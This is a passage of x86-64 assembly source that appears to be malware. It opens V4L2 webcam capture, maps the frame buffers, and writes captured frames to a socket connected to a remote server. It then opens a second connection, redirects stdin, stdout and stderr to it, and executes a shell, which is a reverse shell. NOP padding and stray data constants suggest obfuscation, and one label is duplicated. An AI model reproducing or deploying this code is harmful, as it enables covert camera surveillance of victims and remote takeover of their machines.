

		mov		rax, SYS_connect
		mov		rdi, r13
		mov		rsi, [rbp + 16]
		add		rsi, mydata.serv_addr_video
		;lea		rsi, [rel serv_addr_video]
		mov		rdx, 16
		syscall
		.continue_reverse:
		jmp	[rel .addr9r]
		.addr9: dq 0x421900000009
		.addr9r: dq 0
		dq 0x696900000009
		end_shuffle:
		dq	1942, 9
		test	rax, rax
		jnz		.closing_video

		;struct v4l2_requestbuffers { C'est un buffer les formalites
		;	__u32 count;          // le nombre de tampons
		;	__u32 type;           // le type de tampons
		;	__u32 memory;         // le type de memoire
		;	__u32 reserved[2];    //
		;};
		; struct v4l2_buffer
		mov		dword [rel reqb], NBUF
		mov		dword [rel reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
		mov		dword [rel reqb + 8], V4L2_MEMORY_MMAP
		xor		eax, eax
		mov		[reqb + 12], eax
		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_REQBUFS
		lea		rdx, [rel reqb]
		syscall

%assign i 0
%rep NBUF
		mov		dword [rel v4buf], i
		mov		dword [rel v4buf + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
		mov		dword [rel v4buf + 60], V4L2_MEMORY_MMAP
		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_QUERYBUF
		lea		rdx, [rel v4buf]
		syscall

		mov		rax, SYS_mmap
		xor		rdi, rdi                          ; addr = NULL
		mov		edx, [rel v4buf + 72]                 ; length (dword) → edx
		mov		esi, edx                          ; rsi = length
		mov		edx, PROT_READ | PROT_WRITE       ; rdx
		mov		r10, MAP_SHARED
		mov		r8,  r12                          ; fd
		mov		r9,  [rel v4buf + 64]                 ; offset (qword)
		syscall
		mov		[rel buf_addrs + i*8], rax            ; save address
		mov		eax, [rel v4buf + 72]
		mov		[rel buf_sizes + i*8], rax            ; save size (dword → qword)

		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_QBUF
		lea		rdx, [rel v4buf]
		syscall
%assign i i+1
%endrep
		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_STREAMON
		lea		rdx, [rel cap_type]
		syscall

		mov		rcx, FRAMES
		.loop_frames:
		push	rcx
		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_DQBUF
		lea		rdx, [rel v4buf]
		syscall

		mov		ebx, [rel v4buf]                      ; index (dword)
		mov		edx, [rel v4buf + 8]                  ; bytesused
		lea		rcx, [rel buf_addrs]
		mov		rsi, [rcx + rbx*8]          ; addr
		mov		rdi, r13                          ; stdout
		mov		rax, SYS_write
		syscall

		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_QBUF
		lea		rdx, [rel v4buf]
		syscall
		pop		rcx
		loop	.loop_frames

		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_STREAMOFF
		lea		rdx, [rel cap_type]
		syscall

%assign i 0
%rep NBUF
		mov		rax, SYS_munmap
		mov		rdi, [rel buf_addrs + i*8]
		mov		rsi, [rel buf_sizes + i*8]
		syscall
%assign i i+1
%endrep
		.closing_video:
		mov		rax, SYS_close
		mov		rdi, r12
		syscall

		mov		rax, SYS_close
		mov		rdi, r13
		syscall


		.continue_reverse:
		mov		rax, SYS_socket
		mov		rdi, AF_INET
		mov		rsi, SOCK_STREAM
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		mov		r12, rax

		mov		rax, SYS_connect
		mov		rdi, r12
		lea		rsi, [rel serv_addr]
		mov		rdx, 16
		syscall
		test	rax, rax
		jnz		.exit_ret

		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 0
		syscall
		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 1
		syscall
		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 2
		syscall
		lea		rax, [rel arg0]
		mov		[rel argv], rax
		mov		rax, SYS_execve
		lea		rdi, [rel shell]
		lea		rsi, [rel argv]
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall

	.exit_ret:
		mov		rax, SYS_close
		mov		rdi, r12
		syscall

		mov		rax, SYS_exit
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		syscall
